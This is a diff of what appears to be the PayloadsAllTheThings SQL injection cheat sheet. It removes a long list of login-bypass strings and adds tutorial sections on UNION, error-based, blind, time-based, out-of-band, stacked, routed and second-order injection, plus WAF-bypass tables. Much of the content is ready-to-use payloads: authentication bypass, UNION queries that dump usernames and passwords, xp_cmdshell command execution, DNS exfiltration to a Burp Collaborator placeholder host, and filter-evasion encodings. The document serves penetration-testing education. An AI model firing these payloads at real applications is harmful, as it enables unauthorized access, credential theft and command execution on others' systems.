@@ -18,16 +18,24 @@
 * [Tools](#tools)
 * [Entry Point Detection](#entry-point-detection)
 * [DBMS Identification](#dbms-identification)
-* [Authentication bypass](#authentication-bypass)
-    * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
-* [Polyglot injection](#polyglot-injection-multicontext)
-* [Routed injection](#routed-injection)
-* [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
+* [Authentication Bypass](#authentication-bypass)
+    * [Raw MD5 and SHA1](#raw-md5-and-sha1)
+* [UNION Based Injection](#union-based-injection)
+* [Error Based Injection](#error-based-injection)
+* [Blind Injection](#blind-injection)
+    * [Boolean Based Injection](#boolean-based-injection)
+    * [Blind Error Based Injection](#blind-error-based-injection)
+    * [Time Based Injection](#time-based-injection)
+    * [Out of Band (OAST)](#out-of-band-oast)
+* [Stack Based Injection](#stack-based-injection)
+* [Polyglot Injection](#polyglot-injection)
+* [Routed Injection](#routed-injection)
+* [Second Order SQL Injection](#second-order-sql-injection)
 * [Generic WAF Bypass](#generic-waf-bypass)
-    * [White spaces alternatives](#white-spaces-alternatives)
+    * [White Spaces](#white-spaces)
     * [No Comma Allowed](#no-comma-allowed)
     * [No Equal Allowed](#no-equal-allowed)
-    * [Case modification](#case-modification)
+    * [Case Modification](#case-modification)
 * [Labs](#labs)
 * [References](#references)
 
@@ -121,184 +129,279 @@ Different DBMSs return distinct error messages when they encounter issues. By tr
 
 
 
-## Authentication bypass
+## Authentication Bypass
+
+In a standard authentication mechanism, users provide a username and password. The application typically checks these credentials against a database. For example, a SQL query might look something like this: 
+
+```SQL
+SELECT * FROM users WHERE username = 'user' AND password = 'pass';
+```
+
+An attacker can attempt to inject malicious SQL code into the username or password fields. For instance, if the attacker types the following in the username field:
 
 ```sql
-'-'
-' '
-'&'
-'^'
-'*'
-' or 1=1 limit 1 -- -+
-'="or'
-' or ''-'
-' or '' '
-' or ''&'
-' or ''^'
-' or ''*'
-'-||0'
-"-||0"
-"-"
-" "
-"&"
-"^"
-"*"
-'--'
-"--"
-'--' / "--"
-" or ""-"
-" or "" "
-" or ""&"
-" or ""^"
-" or ""*"
-or true--
-" or true--
-' or true--
-") or true--
-') or true--
-' or 'x'='x
-') or ('x')=('x
-')) or (('x'))=(('x
-" or "x"="x
-") or ("x")=("x
-")) or (("x"))=(("x
-or 2 like 2
-or 1=1
-or 1=1--
-or 1=1#
-or 1=1/*
-admin' --
-admin' -- -
-admin' #
-admin'/*
-admin' or '2' LIKE '1
-admin' or 2 LIKE 2--
-admin' or 2 LIKE 2#
-admin') or 2 LIKE 2#
-admin') or 2 LIKE 2--
-admin') or ('2' LIKE '2
-admin') or ('2' LIKE '2'#
-admin') or ('2' LIKE '2'/*
-admin' or '1'='1
-admin' or '1'='1'--
-admin' or '1'='1'#
-admin' or '1'='1'/*
-admin'or 1=1 or ''='
-admin' or 1=1
-admin' or 1=1--
-admin' or 1=1#
-admin' or 1=1/*
-admin') or ('1'='1
-admin') or ('1'='1'--
-admin') or ('1'='1'#
-admin') or ('1'='1'/*
-admin') or '1'='1
-admin') or '1'='1'--
-admin') or '1'='1'#
-admin') or '1'='1'/*
-1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
-admin" --
-admin';--
-admin" #
-admin"/*
-admin" or "1"="1
-admin" or "1"="1"--
-admin" or "1"="1"#
-admin" or "1"="1"/*
-admin"or 1=1 or ""="
-admin" or 1=1
-admin" or 1=1--
-admin" or 1=1#
-admin" or 1=1/*
-admin") or ("1"="1
-admin") or ("1"="1"--
-admin") or ("1"="1"#
-admin") or ("1"="1"/*
-admin") or "1"="1
-admin") or "1"="1"--
-admin") or "1"="1"#
-admin") or "1"="1"/*
-1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+' OR '1'='1
 ```
 
-## Authentication Bypass (Raw MD5 SHA1)
+And leaves the password field empty, the resulting SQL query executed might look like this:
 
-When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
+```SQL
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
+```
+
+Here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.
+
+:warning: In this case, the database will return an array of results because it will match every users in the table. This will produce an error in the server side since it was expecting only one result. By adding a `LIMIT` clause, you can restrict the number of rows returned by the query. By submitting the following payload in the username field, you will log in as the first user in the database. Additionally, you can inject a payload in the password field while using the correct username to target a specific user. 
+
+```sql
+' or 1=1 limit 1 --
+```
+
+:warning: Avoid using this payload indiscriminately, as it always returns true. It could interact with endpoints that may inadvertently delete sessions, files, configurations, or database data.
+
+* [PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)
+
+
+### Raw MD5 and SHA1
+
+In PHP, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of the password submitted by the user.
 
 ```php
-"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
+sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
 ```
 
-Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`
+An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.
+
+
+| Hash | Input    | Output (Raw)            |  Payload  |
+| ---- | -------- | ----------------------- | --------- |
+| md5  | ffifdyop | `'or'6�]��!r,��b`       | `'or'`    |
+| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8` | `'or'` |
+| sha1 | 3fDf     | `Q�u'='�@�[�t�- o��_-!` | `'='`     |
+| sha1 | 178374   | `ÜÛ¾}_ia!8Wm'/*´Õ`      | `'/*`     |
+| sha1 | 17       | `Ùp2ûjww%6\`            | `\`       |
+
+This behavior can be abused to bypass the authentication by escaping the context.
 
 ```php
-md5("ffifdyop", true) = 'or'6�]��!r,��b
-sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
+sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
+sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b'";
 ```
 
-Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
 
-## Polyglot injection (multicontext)
+## UNION Based Injection
+
+In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.
+
+Let's assume a vulnerable web application retrieves product details based on a product ID from a database: 
+
+```sql
+SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
+```
+
+An attacker could modify the `input_id` to include the data from another table like `users`.
+
+```SQL
+1' UNION SELECT username, password FROM users --
+```
+
+After submitting our payload, the query become the following SQL:
+
+```SQL
+SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
+```
+
+:warning: The 2 SELECT clauses must have the same number of columns.
+
+
+## Error Based Injection
+
+Error-Based SQL Injection is a technique that relies on the error messages returned from the database to gather information about the database structure. By manipulating the input parameters of an SQL query, an attacker can make the database generate error messages. These errors can reveal critical details about the database, such as table names, column names, and data types, which can be used to craft further attacks.
+
+For example, on a PostgreSQL, injecting this payload in a SQL query would result in an error since the LIMIT clause is expecting a numeric value.
+
+```sql
+LIMIT CAST((SELECT version()) as numeric) 
+```
+
+The error will leak the output of the `version()`.
+
+```ps1
+ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
+```
+
+
+## Blind Injection
+
+Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response. 
+
+
+### Boolean Based Injection
+
+Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returns TRUE or FALSE. The attacker can infer information based on differences in the behavior of the application.
+
+Size of the page, HTTP response code, or missing parts of the page are strong indicators to detect whether the Boolean-based Blind SQL injection was successful.
+
+Here is a naive example to recover the content of the `@@hostname` variable.
+
+**Identify Injection Point and Confirm Vulnerability** : Inject a payload that evaluates to true/false to confirm SQL injection vulnerability. For example: 
+
+```ps1
+http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
+http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
+```
+ 
+**Extract Hostname Length**: Guess the length of the hostname by incrementing until the response indicates a match. For example: 
+
+```ps1
+http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
+http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
+http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
+```
+
+**Extract Hostname Characters** : Extract each character of the hostname using substring and ASCII comparison: 
+
+```ps1
+http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
+http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
+```
+ 
+Then repeat the method to discover every characters of the `@@hostname`. Obviously this example is not the fastest way to obtain them. Here are a few pointers to speed it up:
+
+- Extract characters using dichotomy: it reduces the number of requests from linear to logarithmic time, making data extraction much more efficient. 
+
+
+### Blind Error Based Injection
+
+Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.
+
+
+**Example**: Using `json()` function in SQLite to trigger an error as an oracle to know when the injection is true or false.
+
+```sql
+' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
+' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
+```
+
+
+### Time Based Injection
+
+Time-based SQL Injection is a type of blind SQL Injection attack that relies on database delays to infer whether certain queries return true or false. It is used when an application does not display any direct feedback from the database queries but allows execution of time-delayed SQL commands. The attacker can analyze the time it takes for the database to respond to indirectly gather information from the database.
+
+* Default `SLEEP` function for the database
+
+```sql
+' AND SLEEP(5)/*
+' AND '1'='1' AND SLEEP(5)
+' ; WAITFOR DELAY '00:00:05' --
+```
+
+* Heavy queries that take a lot of time to complete, usually crypto functions.
+
+```sql
+BENCHMARK(2000000,MD5(NOW()))
+```
+
+Let's see a basic example to recover the version of the database using a time based sql injection.
+
+```sql
+http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
+```
+
+If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.
+
+
+### Out of Band (OAST)
+
+Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable. 
+
+Different databases offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration: 
+
+* MySQL
+
+  ```sql
+  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+  ```
+
+* MSSQL
+
+  ```sql
+  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+  ```
+
+
+## Stacked Based Injection
+
+Stacked Queries SQL Injection is a technique where multiple SQL statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). This allows an attacker to execute additional malicious SQL commands following a legitimate query. Not all databases or application configurations support stacked queries.
+
+```sql
+1; EXEC xp_cmdshell('whoami') --
+```
+
+
+## Polyglot Injection
+
+A polygot SQL injection payload is a specially crafted SQL injection attack string that can successfully execute in multiple contexts or environments without modification. This means that the payload can bypass different types of validation, parsing, or execution logic in a web application or database by being valid SQL in various scenarios.
 
 ```sql
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
-
-/* MySQL only */
-IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
 ```
 
-## Routed injection
+
+## Routed Injection
+
+> Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. - Zenodermus Javanicus
+
+In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.
+
+**Example 1**:
+
+`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`
 
 ```sql
-admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+' union select 0x2720756e696f6e2073656c65637420312c3223#
 ```
 
-## Insert Statement - ON DUPLICATE KEY UPDATE
+**Example 2**:
 
-ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
+`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.
 
 ```sql
-Inject using payload:
-  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --
-
-The query would look like this:
-INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");
-
-This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
-Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".
-
-After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
+-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
 ```
+
+
+## Second Order SQL Injection
+
+Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.
+
+```py
+username="anything' UNION SELECT Username, Password FROM Users;--"
+password="P@ssw0rd"
+```
+
+Since you are inserting your payload in the database for a later use, any other type of injections can be used UNION, ERROR, BLIND, STACKED, etc.
 
 
 ## Generic WAF Bypass
 
-### White spaces alternatives
+### White Spaces
 
-* No space allowed (`%20`) - bypass using whitespace alternatives
-  ```sql
-  ?id=1%09and%091=1%09--
-  ?id=1%0Dand%0D1=1%0D--
-  ?id=1%0Cand%0C1=1%0C--
-  ?id=1%0Band%0B1=1%0B--
-  ?id=1%0Aand%0A1=1%0A--
-  ?id=1%A0and%A01=1%A0--
-  ```
-* No whitespace - bypass using comments
-  ```sql
-  ?id=1/*comment*/and/**/1=1/**/--
-  ```
-* No Whitespace - bypass using parenthesis
-  ```sql
-  ?id=(1)and(1)=(1)--
-  ```
-* Whitespace alternatives by DBMS
-  ```sql
-  -- Example of query where spaces were replaced by ascii characters above 0x80
-  ♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
-  ```
+Bypass using whitespace alternatives.
 
-| DBMS       | ASCII characters in hexadicimal |
+| Bypass                   | Technique              |
+| ------------------------ | ---------------------- |
+| `?id=1%09and%091=1%09--` | Whitespace alternative |
+| `?id=1%0Aand%0A1=1%0A--` | Whitespace alternative |
+| `?id=1%0Band%0B1=1%0B--` | Whitespace alternative |
+| `?id=1%0Cand%0C1=1%0C--` | Whitespace alternative |
+| `?id=1%0Dand%0D1=1%0D--` | Whitespace alternative |
+| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
+| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
+
+| DBMS       | ASCII characters in hexadecimal |
 | ---------- | ------------------------------- |
 | SQLite3    | 0A, 0D, 0C, 09, 20 |
 | MySQL	5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
@@ -307,46 +410,60 @@ After this, we can simply authenticate with “admin@example.com” and the pass
 | Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
 | MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
 
+
+Bypass using comments and parenthesis.
+
+| Bypass                                    | Technique            |
+| ----------------------------------------- | -------------------- |
+| `?id=1/*comment*/AND/**/1=1/**/--`        | Comment              |
+| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |
+| `?id=(1)and(1)=(1)--`                     | Parenthesis          |
+
  
 ### No Comma Allowed
  
-Bypass using OFFSET, FROM and JOIN
+Bypass using `OFFSET`, `FROM` and `JOIN`.
 
-```sql
-LIMIT 0,1         -> LIMIT 1 OFFSET 0
-SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
-SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
-```
+| Forbidden           | Bypass |
+| ------------------- | ------ |
+| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0` |
+| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |
+| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |
 
 
 ### No Equal Allowed
 
 Bypass using LIKE/NOT IN/IN/BETWEEN
 
-```sql
-?id=1 and substring(version(),1,1)like(5)
-?id=1 and substring(version(),1,1)not in(4,3)
-?id=1 and substring(version(),1,1)in(4,3)
-?id=1 and substring(version(),1,1) between 3 and 4
-```
+
+| Bypass    | SQL Example |
+| --------- | ------------------------------------------ |
+| `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |
+| `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |
+| `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |
+| `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |
 
 
-### Case modification
- 
-* Bypass using uppercase/lowercase (see keyword AND)
-  ```sql
-  ?id=1 AND 1=1#
-  ?id=1 AnD 1=1#
-  ?id=1 aNd 1=1#
-  ```
-* Bypass using keywords case insensitive / Bypass using an equivalent operator
-  ```sql
-  AND   -> &&
-  OR    -> ||
-  =     -> LIKE,REGEXP, BETWEEN, not < and not >
-  > X   -> not between 0 and X
-  WHERE -> HAVING
-  ```
+### Case Modification
+
+Bypass using uppercase/lowercase.
+
+| Bypass    | Technique  |
+| --------- | ---------- |
+| `AND`     | Uppercase  |
+| `and`     | Lowercase  |
+| `aNd`     | Mixed case |
+
+
+Bypass using keywords case insensitive or an equivalent operator.
+
+| Forbidden | Bypass                      |
+| --------- | --------------------------- |
+| `AND`     | `&&`                        |
+| `OR`      | `\|\|`                      |
+| `=`       | `LIKE`, `REGEXP`, `BETWEEN` |
+| `>`       | `NOT BETWEEN 0 AND X`       |
+| `WHERE`   | `HAVING`                    |
 
 
 ## Labs 
@@ -373,6 +490,7 @@ Bypass using LIKE/NOT IN/IN/BETWEEN
 ## References
 
 * [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection - Not So Secure - February 9, 2018](https://web.archive.org/web/20180209143119/https://www.notsosecure.com/analyzing-cve-2018-6376/)
+* [Implement a Blind Error-Based SQLMap payload for SQLite - soka - August 24, 2023][https://sokarepo.github.io/web/2023/08/24/implement-blind-sqlite-sqlmap.html]
 * [Manual SQL Injection Discovery Tips - Gerben Javado - August 26, 2017](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
 * [NetSPI SQL Injection Wiki - NetSPI - December 21, 2017](https://sqlwiki.netspi.com/)
 * [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - August 15, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
